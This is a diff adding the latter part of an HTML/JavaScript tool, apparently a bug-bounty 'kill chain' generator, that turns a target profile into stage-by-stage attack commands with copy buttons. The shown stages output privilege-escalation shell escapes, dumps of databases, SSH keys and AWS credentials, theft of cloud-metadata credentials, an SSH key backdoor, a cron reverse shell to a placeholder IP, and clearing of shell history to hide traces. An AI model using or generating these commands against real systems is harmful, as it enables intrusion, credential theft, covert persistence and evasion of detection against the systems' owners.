+    ['LinPEAS','WinPEAS','find','env','netstat','cat'],
+    postCmds,
+    null
+  ));
+
+  // ── STAGE 5: PRIVILEGE ESCALATION ────────────────────────────────────────
+  const privCmds = [];
+  if(islinux){
+    privCmds.push(`# Run automated priv-esc scanner\ncurl -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh | sh\n\n# Or upload manually:\nwget http://YOUR_SERVER/linpeas.sh -O /tmp/lp.sh\nchmod +x /tmp/lp.sh && /tmp/lp.sh | tee /tmp/lp-out.txt`);
+    privCmds.push(`# Common vectors\n# Sudo misconfiguration:\nsudo -l  # Look for NOPASSWD entries\nsudo /usr/bin/python3 -c 'import os; os.system("/bin/bash")'\n\n# SUID exploitation:\n/usr/bin/find . -exec /bin/bash -p \\;\n/usr/bin/python3 -c 'import os; os.execl("/bin/bash","bash","-p")'`);
+    privCmds.push(`# Kernel exploit (last resort)\nuname -r  # Check kernel version\nsearchsploit linux kernel $(uname -r | cut -d'-' -f1)\n\n# Cron job hijack:\ncat /etc/crontab\nls -la /etc/cron*\n# If cron calls a writable script — overwrite it`);
+  } else {
+    privCmds.push(`# Windows token impersonation\nwhoami /priv  # Look for SeImpersonatePrivilege\n\n# JuicyPotato / PrintSpoofer\n./PrintSpoofer.exe -i -c cmd\n\n# AlwaysInstallElevated\nreg query HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer`);
+  }
+  stages.push(mkStage(5,'PRIVILEGE ESCALATION','Root / SYSTEM Access',STAGE_COLORS[4],'CRITICAL',
+    `Escalate from initial low-privilege access to root/SYSTEM. This unlocks full control over the target system and enables persistence.`,
+    ['Identify privilege escalation vector','Exploit SUID/sudo/kernel/service misconfig','Obtain root/SYSTEM shell','Verify elevated access','Dump credential hashes'],
+    ['LinPEAS','GTFObins','sudo','find','kernel exploits'],
+    privCmds,
+    null
+  ));
+
+  // ── STAGE 6: OBJECTIVE ───────────────────────────────────────────────────
+  const objCmds = [];
+  if(objective==='data'||objective==='rce'){
+    if(hasmysql||haspgsql||hasmongo){
+      objCmds.push(`# Database dump\n# MySQL:\nmysql -u root -p -e "SHOW DATABASES;"\nmysqldump -u root -p --all-databases > /tmp/full_dump.sql\n\n# PostgreSQL:\npsql -U postgres -c "\\l"\npg_dumpall -U postgres > /tmp/pg_dump.sql`);
+    }
+    objCmds.push(`# Sensitive file exfiltration\n# .env / config files\ncat /var/www/html/.env\ncat /etc/nginx/nginx.conf\nfind / -name "*.pem" -o -name "id_rsa" 2>/dev/null\n\n# AWS credentials\ncat ~/.aws/credentials\ncat ~/.aws/config`);
+    if(iscloud){
+      objCmds.push(`# Cloud metadata exfiltration\n# AWS IMDSv1:\ncurl http://169.254.169.254/latest/meta-data/iam/security-credentials/\ncurl http://169.254.169.254/latest/meta-data/identity-credentials/ec2/security-credentials/ec2-instance\n\n# Use stolen creds:\naws configure --profile stolen\naws s3 ls --profile stolen\naws iam list-users --profile stolen`);
+    }
+  } else if(objective==='persistence'){
+    objCmds.push(`# Add SSH backdoor\nmkdir -p ~/.ssh\necho "YOUR_PUBLIC_KEY" >> ~/.ssh/authorized_keys\nchmod 700 ~/.ssh && chmod 600 ~/.ssh/authorized_keys\n\n# Cron reverse shell\n(crontab -l 2>/dev/null; echo "*/5 * * * * bash -i >& /dev/tcp/YOUR_IP/4444 0>&1") | crontab -`);
+  }
+  stages.push(mkStage(6,'OBJECTIVE','Mission Completion',STAGE_COLORS[5],'HIGH',
+    `Execute the primary objective: ${objective.toUpperCase()}. At this stage full access is confirmed — extract maximum value for the report.`,
+    ['Execute primary objective','Document all findings with timestamps','Capture proof-of-concept screenshots','Extract evidence for bug report','Avoid destructive actions'],
+    ['mysql','pg_dump','aws-cli','ssh','scp'],
+    objCmds,
+    'Document EVERYTHING. Timestamps, payloads, responses. Your PoC is worthless without evidence.'
+  ));
+
+  // ── STAGE 7: REPORTING ───────────────────────────────────────────────────
+  const reportCmds = [];
+  reportCmds.push(`# Generate report structure\ncat << 'EOF'\n## Vulnerability Report\n\n**Target:** ${domain||'[DOMAIN]'}\n**Date:** $(date)\n**Severity:** Critical\n\n### Summary\n[2-3 sentence overview]\n\n### Steps to Reproduce\n1. Navigate to [URL]\n2. [Action]\n3. Observe [result]\n\n### Impact\n[Business impact]\n\n### CVSS Score\n[Calculate at cvssadvisor.com]\n\n### Remediation\n[Specific fix recommendation]\nEOF`);
+  reportCmds.push(`# CVSS v3.1 quick reference\n# AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H = 10.0 (Critical)\n# AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H = 8.8 (High)\n\n# Cleanup — remove all artifacts\nrm /tmp/linpeas* /tmp/shell* 2>/dev/null\nunset HISTFILE  # Clear bash history`);
+  stages.push(mkStage(7,'REPORTING','Document & Report',STAGE_COLORS[6],'LOW',
+    `Compile all findings into a clear, professional bug bounty report. Good documentation is what separates a $500 report from a $10,000 one.`,
+    ['Write clear steps to reproduce','Calculate CVSS score accurately','Describe full business impact','Provide specific remediation advice','Remove all test artifacts from system'],
+    ['CherryTree','Obsidian','CVSS Calculator','HackerOne','Bugcrowd'],
+    reportCmds,
+    'Platforms like HackerOne pay significantly more for reports with clear PoC, impact analysis, and professional formatting.'
+  ));
+
+  return stages;
+}
+
+// ── BUILD CHAIN ───────────────────────────────────────────────────────────────
+function buildChain(){
+  const domain = document.getElementById('f-domain').value.trim()||'target.example.com';
+  const stack  = document.getElementById('f-stack').value.trim()||'PHP, MySQL, Apache';
+  const type   = document.getElementById('f-type').value;
+  const finding= document.getElementById('f-finding').value;
+  const auth   = document.getElementById('f-auth').value;
+  const objective=document.getElementById('f-objective').value;
+  const notes  = document.getElementById('f-notes').value.trim();
+
+  // Show loading
+  document.getElementById('input-panel').style.display='none';
+  document.getElementById('result').style.display='none';
+  const loading=document.getElementById('loading');
+  loading.style.display='flex';
+
+  const msgs=['Analyzing target profile...','Mapping attack vectors...','Selecting exploit chain...','Building stage payloads...','Optimizing bypass techniques...','Finalizing kill chain...'];
+  let mi=0;
+  const interval=setInterval(()=>{
+    if(mi<msgs.length){document.getElementById('loading-text').textContent=msgs[mi++];}
+  },380);
+
+  setTimeout(()=>{
+    clearInterval(interval);
+    loading.style.display='none';
+
+    const stages=generateChain(domain,stack,type,finding,auth,objective,notes);
+    renderChain(domain,stack,finding,stages);
+
+    document.getElementById('result').style.display='block';
+
+    // Animate stages in
+    setTimeout(()=>{
+      document.querySelectorAll('.stage').forEach((el,i)=>{
+        setTimeout(()=>el.classList.add('visible'),i*120);
+      });
+    },100);
+  },2500);
+}
+
+// ── RENDER ────────────────────────────────────────────────────────────────────
+const FINDING_NAMES={
+  fileupload:'File Upload → RCE',sqli:'SQL Injection',ssti:'SSTI',
+  ssrf:'SSRF',xss:'XSS',idor:'IDOR',rce:'Direct RCE',
+  lfi:'LFI/Path Traversal',auth:'Auth Bypass',xxe:'XXE Injection'
+};
+
+function renderChain(domain,stack,finding,stages){
+  document.getElementById('ct-domain').textContent=domain;
+  document.getElementById('cm-stack').textContent=stack||'Unknown';
+  document.getElementById('cm-finding').textContent=FINDING_NAMES[finding]||finding;
+  document.getElementById('cm-stages').textContent=stages.length;
+
+  // Risk rating
+  const highRiskFindings=['fileupload','sqli','ssti','rce','lfi'];
+  const riskLevel=highRiskFindings.includes(finding)?'CRITICAL':'HIGH';
+  const riskEl=document.getElementById('chain-risk');
+  riskEl.textContent=riskLevel;
+  riskEl.style.color=riskLevel==='CRITICAL'?'#ff2244':'#ff6600';
+  riskEl.style.borderColor=riskLevel==='CRITICAL'?'#ff2244':'#ff6600';
+  riskEl.style.textShadow=`0 0 20px ${riskLevel==='CRITICAL'?'rgba(255,34,68,0.4)':'rgba(255,102,0,0.4)'}`;
+
+  // Summary bar
+  const bar=document.getElementById('summary-bar');
+  bar.innerHTML=stages.map((s,i)=>`<div class="sb-seg" style="flex:1;background:${s.color};opacity:0.7"></div>`).join('');
+
+  // Timeline
+  const tl=document.getElementById('timeline');
+  tl.innerHTML='';
+  stages.forEach((s,i)=>{
+    const div=document.createElement('div');
+    div.className='stage';
+    div.innerHTML=`
+      <div class="stage-node" style="border-color:${s.color};color:${s.color};box-shadow:0 0 16px ${s.color}44">
+        ${String(s.num).padStart(2,'0')}
+      </div>
+      <div class="stage-body">
+        <div class="stage-head" onclick="toggleStage(this)">
+          <div class="stage-num">STAGE ${String(s.num).padStart(2,'0')} / ${String(stages.length).padStart(2,'0')}</div>
+          <div class="stage-name" style="color:${s.color}">${s.phase} — ${s.name}</div>
+          <div class="stage-badge" style="background:${s.color}20;color:${s.color};border:1px solid ${s.color}50">${s.badge}</div>
+          <div class="stage-toggle">▼</div>
+        </div>
+        <div class="stage-content ${i<2?'open':''}">
+          <div class="stage-inner">
+            <div class="stage-desc">${escH(s.desc)}</div>
+
+            <div class="section-label">Objectives</div>
+            <div class="objectives">
+              ${s.objectives.map(o=>`<div class="obj">${escH(o)}</div>`).join('')}
+            </div>
+
+            <div class="section-label">Tools</div>
+            <div class="tags" style="margin-bottom:1rem">
+              ${s.tools.map(t=>`<span class="tag" style="color:${s.color};border-color:${s.color}40;background:${s.color}10">${escH(t)}</span>`).join('')}
+            </div>
+
+            <div class="section-label">Commands & Payloads</div>
+            ${s.commands.map(c=>`
+              <div class="code-block">
+                <button class="copy-btn" onclick="copyCode(this)">copy</button>
+                <pre>${syntaxHL(c)}</pre>
+              </div>
+            `).join('')}
+
+            ${s.notes?`<div style="margin-top:0.8rem;padding:0.6rem 0.9rem;background:rgba(255,204,0,0.05);border:1px solid rgba(255,204,0,0.2);border-radius:3px;font-size:0.68rem;color:#cc9900;line-height:1.6;">
+              ⚡ <strong style="color:var(--yellow)">NOTE:</strong> ${escH(s.notes)}
+            </div>`:''}
+          </div>
+        </div>
+      </div>
+    `;
+    tl.appendChild(div);
+  });
+
+  // Open first 2 stages
+  document.querySelectorAll('.stage-toggle').forEach((t,i)=>{
+    if(i<2)t.classList.add('open');
+  });
+}
+
+function toggleStage(head){
+  const content=head.nextElementSibling;
+  const toggle=head.querySelector('.stage-toggle');
+  const isOpen=content.classList.contains('open');
+  content.classList.toggle('open',!isOpen);
+  toggle.classList.toggle('open',!isOpen);
+}
+
+function syntaxHL(code){
+  return code
+    .replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;')
+    .replace(/(#[^\n]*)/g,'<span class="code-comment">$1</span>')
+    .replace(/\b(curl|wget|nmap|sqlmap|hydra|python3|bash|sh|cat|find|chmod|echo|mkdir|grep|sudo|ssh|mysql|psql|env|id|whoami|uname)\b/g,'<span class="code-cmd">$1</span>')
+    .replace(/(--[a-zA-Z\-]+|-[a-zA-Z]+(?=\s))/g,'<span class="code-flag">$1</span>')
+    .replace(/(\$\{[^}]+\}|\$\([^)]+\))/g,'<span class="code-path">$1</span>')
+    .replace(/(['"`][^'"`\n]{2,}['"`])/g,'<span class="code-string">$1</span>');
+}
+
+function escH(s){return String(s).replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;');}
+
+function copyCode(btn){
+  const pre=btn.nextElementSibling;
+  navigator.clipboard.writeText(pre.innerText).then(()=>{
+    btn.textContent='✓ copied';btn.classList.add('ok');
+    setTimeout(()=>{btn.textContent='copy';btn.classList.remove('ok');},1800);
+  });
+}
+
+function copyReport(){
+  const stages=document.querySelectorAll('.stage');
+  let report=`KILL CHAIN REPORT\n${'='.repeat(50)}\nTarget: ${document.getElementById('ct-domain').textContent}\nStack: ${document.getElementById('cm-stack').textContent}\nEntry: ${document.getElementById('cm-finding').textContent}\nGenerated: ${new Date().toISOString()}\n\n`;
+  stages.forEach((s,i)=>{
+    const name=s.querySelector('.stage-name')?.textContent||'';
+    const desc=s.querySelector('.stage-desc')?.textContent||'';
+    const cmds=[...s.querySelectorAll('pre')].map(p=>p.innerText).join('\n\n');
+    report+=`\n${'─'.repeat(40)}\n${name}\n${'─'.repeat(40)}\n${desc}\n\nCOMMANDS:\n${cmds}\n`;
+  });
+  navigator.clipboard.writeText(report).then(()=>alert('Full report copied to clipboard!'));
+}
+
+function resetBuilder(){
+  document.getElementById('result').style.display='none';
+  document.getElementById('input-panel').style.display='block';
+  window.scrollTo({top:0,behavior:'smooth'});
+}
+
+function loadDemo(){
+  document.getElementById('f-domain').value='admin.shopify-store.example.com';
+  document.getElementById('f-stack').value='PHP 8.1, Laravel, MySQL 8.0, nginx, Cloudflare WAF';
+  document.getElementById('f-type').value='web';
+  document.getElementById('f-finding').value='fileupload';
+  document.getElementById('f-auth').value='user';
+  document.getElementById('f-objective').value='rce';
+  document.getElementById('f-notes').value='Cloudflare WAF active. Rate limiting on login (5 req/min). Found avatar upload at /profile/upload. Site running Laravel 9.x.';
+  buildChain();
+}
+</script>
+</body>
+</html>
